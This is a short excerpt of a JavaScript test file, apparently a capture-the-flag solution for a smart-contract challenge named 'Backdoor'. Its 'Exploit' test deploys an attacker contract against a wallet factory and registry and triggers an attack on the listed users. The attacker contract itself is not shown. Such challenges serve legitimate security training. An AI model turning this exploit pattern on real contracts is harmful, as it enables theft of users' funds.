...
describe('[Challenge] Backdoor', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackerFactory = await ethers.getContractFactory("WalletRegistryAttacker", attacker);
        const attackerContract = await attackerFactory.deploy(this.walletFactory.address, this.walletRegistry.address);
        let tx = await attackerContract.attack(users);
        await tx.wait();
    });
